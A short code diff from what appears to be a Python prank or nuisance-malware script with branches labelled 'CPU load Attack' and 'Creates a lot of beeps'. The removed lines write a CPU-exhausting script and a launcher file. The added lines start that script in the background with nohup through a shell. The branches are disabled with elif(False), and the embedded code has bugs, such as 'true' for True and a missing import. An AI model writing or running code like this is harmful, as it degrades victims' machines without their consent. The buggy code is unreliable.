@@ -517,11 +517,8 @@ def main():
     #CPU load Attack
     elif(False):
         if(path.exists("remotecmd.py") == False):
-            with open("CPULoadGen.py", "w") as cpu:
-                cpu.write("from multiprocessing import Pool\nfrom multiprocessing import cpu_count\nimport math\ndef f(x):\n\twhile(true):\n\t\tx * factorial(1000) \n\tdef main():\n\t\tprocesses = cpu_count()\n\t\tpool = Pool(processes)\n\t\tpool.map(f, range(processes))\nmain()")
-            with open('remotecmd.py', 'w') as rcmd:
-                rcmd.write("import subprocess\ndef main():\n\tcmd = \"nohup python CPULoadGen.py\"\n\tprocess = subprocess.Popen(cmd, shell=True)\n\nmain()")
-        #exec(open("CPULoadGen.py").read())
+            cmd = "nohup python CPULoadGen.py"
+            process = subprocess.Popen(cmd, shell=True)
     #Creates a lot of beeps
     elif(False):
         if((path.exists("m1.py") == False)):
